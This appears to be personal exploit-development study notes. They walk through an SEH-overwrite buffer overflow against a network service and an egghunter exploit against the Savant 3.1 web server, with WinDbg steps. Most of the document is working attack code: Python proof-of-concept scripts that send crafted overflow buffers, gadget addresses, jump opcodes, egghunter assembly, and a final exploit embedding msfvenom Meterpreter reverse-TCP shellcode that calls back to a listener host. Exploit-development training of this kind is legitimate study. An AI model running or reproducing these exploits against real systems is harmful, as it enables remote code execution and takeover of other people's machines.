# SEH
The poc for this pow is the following 
```
#!/usr/bin/python

import sys 
import socket
from struct import pack

server = sys.argv[1]

port = 9121
size = 1000

inputBuffer = b"\x41" * size

header =  "\x75\x19\xba\xab"
header += "\x03\x00\x00\x00"
header += "\x00\x40\x00\x00"
header += pack('<I', len(inputBuffer))
header += pack('<I', len(inputBuffer))
header += pack('<I', ord(inputBuffer[-1]))


buf = header + inputBuffer


try:
    
    print ("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done !")

except:

    print("[-] Unable to communicate to target %s:%s" %(server,port)) 
```
## Understanding the SEH 
### Walk the exception list in windbg after crash
_EXCEPTION_REGISTRATION_RECORD structures is saved in the stack
```
!teb #take ExceptionList address

dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c #01c4fe1c will be the exception list address

#take the Next address

dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54 #0x01c4ff54 will be the next address previously grabbed    

```
### List the current thread exception handler chain - Instead of the manual process (consider the last address shown as the handler address)
```
!exchain
```
Inspect the callstack (**k**) to determine which functions were called before the eip was overwritten

## Gaining Code Execution
### Determine the exact offset required to precisely overwrite the exception handler on the stack.
```
msf-pattern_create -l 1000
```
The new pow
```
server = sys.argv[1]

port = 9121
size = 1000

inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
```
In windbg
```
!exchain
```
In kali
```
msf-pattern_offset - l 1000 -q 33654132 # 33654132 being the address of the handler got with exchain
```
The new pow
```
server = sys.argv[1]

port = 9121
size = 1000

inputBuffer = b"\x41" * 128 # 128 being the size got with msf-pattern_offset
inputBuffer += b"\x42\x42\x42\x42"
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
Run `!exchain` to confirm the handler address is overwritten by `\x42\x42\x42\x42` 
### Detect Bad charcaters
```
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
```

The pow
```
inputBuffer = b"\x41" * 128
inputBuffer+= b"\x42\x42\x42\x42"
inputBuffer += badchars
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
The instruction pointer should be overwritten with the second argument (EstablisherFrame) passed to the _except_handler function (in the stack). In order to check the bad chars:
```
dds esp L5
db 0132ff54 # 0x0132ff54 being the address of the second argument of ntdll!ExecuteHandler2 function noticed in the top of the stack
```

### Finding a P/P/R Instruction Sequence
```
.load narly
!nmod

#scripting
# should be placed in a ".wds" file (ex C:\Users\vagrant\Desktop\find_ppr.wds)
#here 10000000 and 10226000 are start and end address of the module (with “/SafeSEH OFF” and not containing bad chars) to check for P/P/R instruction

.block
{
    .for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
    {
        .for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
        {
            s-[1]b 10000000 10226000 $t0 $t1 c3
        }
    }
}
```
We execute this in the windows machine 
`$><C:\Users\vagrant\Desktop\find_ppr.wds`
Once an address is picked (assumed 0x1015a2f0 here), this is the new poc
```
inputBuffer = b"\x41" * 128
inputBuffer += pack("<L" , (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax ; pop ebx ; ret
inputBuffer+= b"\x43" * (size - len(inputBuffer))
```
Break point at this address in debugger
`bp 0x1015a2f0`


### Write the Next SEH (offset - 4)
The handler is execute then the next handler 
The after executing the P/P/R, we should be redirected to the Next Handler address overwriiten with 41 41 41 41 (4 bytes before the offset which is 128 here)
The new pow
```
inputBuffer = b"\x41" * 124 
inputBuffer += b"\x42" * 4 # (NSEH)
inputBuffer += pack("<L" , (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax ; pop ebx ; ret
inputBuffer += b"\x43" * (size - len(inputBuffer))
```
### if a jump is needed
```
u eip
dds esp
```
If a small jump is needed to escape some junk code like `lock ...` (causing access violation), assembl the instruction from the current place of the assembly
```
a
jmp 0x018fff5c
u eip L1 # this will give the opcode
```
The upcode will be addes for the NSEH before the SEH handler
The new pow becomes 
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    inputBuffer = b"\x41" * 124 # (offset - 4)
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x42" * (size - len(inputBuffer))
```

The shellcode is not fully taken after the SEH handler ? Check if **all** the shellcode is appearing and which part is taken 
```
dd eip L30
!teb # and compare the Stack base with the first eip address
```
If not, search the stack and see if we can find all the shellcode (with dummy and unique value for search: here will be ... 90 90 90 90 41 41 41 41 ...)

The new pow
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    shellcode = b"\x43" * 400
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) #the most important part
    inputBuffer+= shellcode
```
We can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable **right after taking our short jump of NSEH (0x06eb9090)**

```
!teb
s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43 # 01aee000 being the stacklimit printed by teb and 01af0000 the stackbase

dd 01aefc70 L65 #01aefc70 being the result of the search
```

The next step is to determine the offset from the current stack pointer to the beginning of the shellcode. This will allow us to use the limited space we have to assemble a set of instructions that will allow us to "island hop", redirecting execution to our shellcode.
```
? 01aefc74 - @esp # 01aefc70 is the address from which the 43 43 43 43 is stating 
# the result of this operation will be in hex
```
let's assemble a few instructions to increase the stack pointer by 0x830 bytes followed by a "jmp esp" to jump to the shellcode next.
```
kali@kali:~$ msf-nasm_shell
nasm > add sp, 0x830 # 830 being the result of the previous operation; make sure there is no null bytes
nasm > jmp esp
```
Update the pow to include the ADD assembly instruction, followed by a "jmp esp" to redirect the execution flow to the shellcode
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    shellcode = b"\x90" * 8
    shellcode+= b"\x43" * (400 - len(shellcode))

    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH) 
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer+= b"\xff\xe4" # jmp esp
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode
```

### Obtaining a Shell
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
    shellcode = b"\x90" * 20
    shellcode += b""
    shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
    ...
    shellcode += b"\xc8\xed\x4c\x07\x0f\x2e\xeb\x18\x3a\x13\x5a"
    shellcode+= b"\x43" * (400 - len(shellcode))
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer+= b"\xff\xe4" # jmp esp
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    buf = header + inputBuffer
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
```

## Short/Long jump to shellcode
The full shellcode may not be located at the begenning of the stack, so you should search it address in the stack

## shellcode 

### inspect the callstack (k) to determine which functions were called before the eip was overwritten

## Island hooping 
after P/P/R, `u eip` or `dds esp` 
do we need to jump ? if yes
```
a
jmp 0x018fff5c # 0x018fff5c being here where we want to jump to from the current step
u eip L1 # this will give the assembly opcode for the jump
dds eip L4
```
In this case, the offset for the jump is **six** bytes rather than four (the length of the P/P/R address).

we have the short jump, let us update our proof of concept to include it: **0x06eb9090**
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x41" * (size - len(inputBuffer))
```
After carefully reviewing the memory pointed to by the instruction pointer, we notice that we are very close to reaching the beginning of our stack. The update:
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000

    shellcode = b"\x43" * 400
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode
```

```
!teb
s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43
#Check if the shellcode is not truncated
dd 01aefc70 L65
```
Our next step is to determine the offset from our current stack pointer to the beginning of our shellcode. To determine this, we can simply use **?**  to subtract between the **memory address** of the start of our shellcode (0x01aefc74) and the current value of the **stack pointer**.
```
? 01aefc74 - @esp
```
The result gave **Evaluate expression: 2096 = 00000830** 
Using the limited space available after our short jump, let’s assemble a few instructions to increase the stack pointer by 0x830 bytes followed by a `jmp esp` to jump to our shellcode next. Using `add esp, 0x830` generates a null byte so we will procede differently:
```
nasm > add sp, 0x830 #=> 6681C43008
nasm > jmp esp #=> FFE4
```
The new poc becomes 
```
try:
    server = sys.argv[1]
    port = 9121
    size = 1000
    shellcode = b"\x90" * 8
    shellcode+= b"\x43" * (400 - len(shellcode))
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer+= b"\xff\xe4" # jmp esp
    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode
```

## Obtaining a Shell
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 9121
    size = 1000
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
    shellcode = b"\x90" * 20

    shellcode += b""
    shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
    ...
    shellcode += b"\xb3\x44\x07\x9c\x96"

    shellcode+= b"\x43" * (400 - len(shellcode))
    inputBuffer = b"\x41" * 124
    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret

    inputBuffer+= b"\x90" * 2
    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
    inputBuffer+= b"\xff\xe4" # jmp esp

    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
    inputBuffer+= shellcode

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    buf = header + inputBuffer

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")
except socket.error:
    print("Could not connect!")
```

# Egg-hunter (Savant 3.1)
## POC 
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    size = 260
    httpMethod = b"GET /"
    inputBuffer = b"\x41" * size
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest

    print("Sending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    print("Done!")
except socket.error:
    print("Could not connect!")
```

- Limited amount of shell (3 bytes); the esp is null terminated 
```
dds @esp L5
``` 
- increasing the size of the buffer in the poc by even one byte will cause a different crash where we do not gain control over the eip
- the second DWORD on the stack is interesting because it points to a memory location that is very close to our current stack pointer
```
dds @esp L2
dc poi(esp+4)
```

## Detecting Bad Characters
In order to identify which of the bad characters prevent Savant from crashing, we will modify our proof of concept and comment out the first half of the lines from the badchars variable.
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 260

    badchars = (
    #b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    #b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    #b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    #b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    #b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    #b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    #b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    #b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    #b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    #b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
    httpMethod = b"GET /"
    inputBuffer = badchars
    inputBuffer+= b"\x41" * (size - len(inputBuffer))
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
....
```
in windbg
`db esp - 0n257`
The list of all bad characters is shown below `0x00, 0x0A, 0x0D, 0x25`

## Gaining Code Execution
let’s try to determine the exact offset to our instruction pointer overwrite.
```
...
try:
    server = sys.argv[1]
    port = 80
    httpMethod = b"GET /"
    inputBuffer =
    b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
    Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af
    6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A
    i5Ai"
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
...
```
If this causes a different access violation in which the instruction pointer is not overwritten with a unique value as expected:
```
...
try:
    server = sys.argv[1]
    port = 80
    httpMethod = b"GET /"
    inputBuffer = b"\x41" * 130
    inputBuffer+= b"\x42" * 130
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
...
```
until we get the exact offset (253 bytes) in this case
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 260
    httpMethod = b"GET /"
    inputBuffer = b"\x41" * 253
    inputBuffer+= b"\x42\x42\x42\x42"
    inputBuffer+= b"\x43" * (size - len(inputBuffer))
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
...
```
this poc should be run multiple time to confirm that this behavior is consistent across multiple crashes.

Next, we need to choose a module that comes with the application compiled without any protections. 
```
.load narly
!nmod
```

`dds @esp L4`
to confirm the stack ends with 00 (ends of srings); the result of the previous operation should be 00434343

Let’s update our proof of concept to **only overwrite the lower three bytes of the EIP** register as follows (as the module all start with 00) and our payload is a string that this null terminated.
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"GET /"
    inputBuffer = b"\x41" * size
    inputBuffer+= b"\x42\x42\x42"
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
    ...
```
If suceed, the eip should be now `eip=00424242`

the second DWORD on the stack at the time of the crash points very close to our current stack pointer (`dc poi(@esp+0x04)`). 

Our goal now is to find an assembly instruction sequence that will redirect the execution flow to this data using `POP R32; RET.`.

**Before proceeding to find a POP R32; RET** instruction sequence, let’s first **inspect the generated instructions from the HTTP method**.
```
u poi(@esp+0x04)
```
in the specific case, we have the following 
```
02efea84 47 inc edi
02efea85 45 inc ebp
02efea86 54 push esp
02efea87 0000 add byte ptr [eax],al
```
The last instructions use the ADD operation where the AL register is added to the value that EAX is pointing to. This can be problematic as it operates on the assumption that EAX points to a valid memory address.

We caninspect the value that will be popped by the first instruction 
```
dds esp L1
!teb
```
If the first value of the **esp** (that would be poped) is between **StackLimit** and **StackBase**, then it's a valid memory address.
This means that an instruction like **POP EAX; RET**, can guarantee that EAX will point to a valid memory address. Let's get the opcode and search the sequence using windbg

```
kali@kali:~$ msf-nasm_shell
nasm > pop eax
00000000 58 pop eax
nasm > ret
00000000 C3 ret

#opcodes => 58 C3
#now in windbg

0:003> lm m Savant
start end module name
00400000 00452000 Savant C (no symbols)
0:004> s -[1]b 00400000 00452000 58 c3
#some example of address 
#0x00418674
#0x0041924f
```
Let's choose the first address and update the poc
```
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"GET /"
    inputBuffer = b"\x41" * size
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    buf = httpMethod + inputBuffer + httpEndRequest
```
Next, breakpoint to the address and nextstep until `dc @eip` and see the GET method  and the ... AAAA 

## Changing the HTTP Method
Let’s update our proof of concept and replace the GET method with some hex bytes of our choice:
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /"
    inputBuffer = b"\x41" * size
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
...
```
Let's breakpoint (`bp 0x00418674`)
```
bp 0x00418674
bl
g
dc poi(@esp+4) # we should see the GET replace by CCCCC
```
- we were able to successfully change our HTTP method to an invalid one without affecting the crash
### short jmp to the AAAA ( eb 17 ) Short jump of 0x17

```
...
try:
    server = sys.argv[1]
    port = 80   
    size = 253
    httpMethod = b"\xeb\x17\x90\x90" + b" /" # Short jump of 0x17
    inputBuffer = b"\x41" * size
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    buf = httpMethod + inputBuffer + httpEndRequest
...
```
Breakpoint at POP EAX; RET instruction sequence and step into. the eb 17 will generate an unexpected RETF instruction (probabbly bad char), so we proceed with conditional jmp
```
kali@kali:~$ msf-nasm_shell
nasm > xor ecx, ecx
00000000 31C9 xor ecx,ecx
nasm > test ecx, ecx
00000000 85C9 test ecx,ecx
nasm > je 0x17
00000000 0F8411000000 jz near 0x17
```
- the `je 0x17` instruction generates null bytes, but here we will just enter `0F8411` part as while debuging there's already null bytes after the GET method  
- let's update the poc and set a breakpoint at the address of our POP EAX; RET instruction sequence
```
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17
    
    inputBuffer = b"\x41" * size
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
```
while executing `u poi(@esp) L3` after the `ret` instruction, we should see the xor, test and je instruction.
- calculate the space available for shellcode inside the AAAAAs
```
db @eip L100
? 02feeb8f + 0n11 - @eip
```

## Finding Alternative Places to Store Large Buffers 
Because we are dealing with a web server, we will add it as a header just after the pop ret with `b"\r\n" and  b"w00tw00t" + b"\x44" * 400 `
    
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17
    
    inputBuffer = b"\x41" * size
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    
    httpEndRequest = b"\r\n"
    httpEndRequest += b"w00tw00t" + b"\x44" * 400
    
    httpEndRequest += b"\r\n\r\n"
    buf = httpMethod + inputBuffer + httpEndRequest
...
```
- Running the proof of concept does not seem to cause our application to crash, which means this method will not work here.
- we try to add `b"w00tw00t" + b"\x44"` after the end of the web request 
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17
    
    inputBuffer = b"\x41" * size
    inputBuffer+= pack("<L", (0x418674)) # 0x00418674 - pop eax; ret
    httpEndRequest = b"\r\n\r\n"

    shellcode = b"w00tw00t" + b"\x44" * 400

    buf = httpMethod + inputBuffer + httpEndRequest + shellcode
...
```
- Running this poc hits the breakpoint at the POP EAX; RET instruction sequence 
- Next, we attempt to find our unique ASCII string in memory using the `s` command
```
0:003> s -a 0x0 L?80000000 w00tw00t
01365a5e 77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44 w00tw00tDDDDDDDD

0:003> db 01365a5e + 0n408 - 4 L4
01365bf2 44 44 44 44 DDDD
```
Using the `!teb` revealed it is not in the stack (not between StackBase and StackLimit addresses). 
```
!address 01365a5e
```
shows the address is withing the heap
## Egghunter
Egghunter normal (**check and edit the system call number**)
```
from keystone import *

CODE = (
    # We use the edx register as a memory page counter
    "loop_inc_page:"    
    "or dx, 0x0fff         ;"     # Go to the last address in the memory page
    
    "loop_inc_one:                      "    
    "inc edx               ;" # Increase the memory counter by one

    "loop_check:                "
    "push edx ;" # Save the edx register which holds our memory address on the stack
    "mov eax, 0xfffffe44;" #Push the negative value of the system call number
    #this value is obtained by doing u ntdll!NtAccessCheckAndAuditAlarm and calculating whith 0x00 - the_number_found

    # Initialize the call to NtAccessCheckAndAuditAlarm
    "neg eax;"
    "int 0x2e;" # Perform the system call 
    "cmp al, 05;" # Check for access violation, 0xc0000005 (ACCESS_VIOLATION)
    "pop edx;" # Restore the edx register to check later for our egg

    "loop_check_valid:"
    "je loop_inc_page ;"  # If access violation encountered, go to next page

    "is_egg:"    
    "mov eax, 0x74303077        ;" # Load egg (w00t in this example) into the eax register
    "mov edi, edx;"  # Initializes pointer with current checked address
    "scasd;"  # Compare eax with doubleword at edi and set status flags
    "jnz loop_inc_one;" # No match, we will increase our memory counter by one
    "scasd;" # First part of the egg detected, check for the second part
    "jnz loop_inc_one;" # No match, we found just a location with half an egg
    
    "matched:"
    "jmp edi;" # The edi register points to the first  byte of our buffer, we can jump to it
)

# Initialize engine in 32-bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

egghunter = ""

for dec in encoding:
    egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")


print("Opcodes = (\"" + egghunter + "\")")
```

Universal egghunter (**no need to check syscall number before**)
```
from keystone import *

CODE = (
"       start:  "
"   jmp get_seh_address ;  " # jump to a negative call to dynamically obtain egghunter position
"   build_exception_record:  "
"   pop ecx ;  " # pop the address of the exception_handler into ecx
"   mov eax, 0x74303077 ;  " # mov signature into eax
"   push ecx ;  " # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
"   push 0xffffffff ;  " # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
"   xor ebx, ebx ;  " # null out ebx
"   mov dword ptr fs:[ebx], esp ;  " # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure

"       is_egg:  " # 
"   push 0x02 ;  " # push 0x02
"   pop ecx ;  " # pop the value into ecx which will act as a counter
"   mov edi, ebx ;  " # mov memory address into edi
"   repe scasd ;  " # check for our signature, if the page is invalid we trigger an exception and jump to our exception_handler function
"   jnz loop_inc_one ;  " # if we didn't find signature, increase ebx and repeat
"   jmp edi ;  " # we found our signature and will jump to it

"       loop_inc_page:  " # 
"   or bx, 0xfff ;  " # if page is invalid the exception_handler will update eip to point here and we move to next page

"       loop_inc_one:    " # 
"   inc ebx ;  " #  increase ebx by one byte
"   jmp is_egg ;  " #  check for signature again

"       get_seh_address:   " # 
"   call build_exception_record ;  " # call to a higher address to avoid null bytes & push return to obtain egghunter position
"   push 0x0c ;  " # push 0x0c onto the stack
"   pop ecx ;  " # pop the value into ecx 
"   mov eax, [esp+ecx] ;  " # mov into eax the pointer to the CONTEXT structure for our exception
"   mov cl, 0xb8 ;  " # mov 0xb8 into ecx which will act as an offset to the eip
"   add dword ptr ds:[eax+ecx], 0x06 ;  " # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
"   pop eax ;  " # save return value into eax
"   add esp, 0x10 ;  " # increase esp to clean the stack for our call
"   push eax ;  " # push return value back into the stack
"   xor eax, eax ;  " # null out eax to simulate  ExceptionContinueExecution return
"   ret ;  " # return
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

egghunter = ""
for dec in encoding:
    egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print("egghunter = (\"" + egghunter + "\")")
```

New poc 
```
...
try:
    server = sys.argv[1]
    port = 80
    size = 253
    httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /" # xor ecx, ecx; test ecx, ecx; je 0x17
    
    egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90" # NOP sled
                 b"\x66\x81\xca\xff\x0f\x42\x52\xb8"
                 b"\x44\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c"
                 b"\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74"
                 b"\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7")

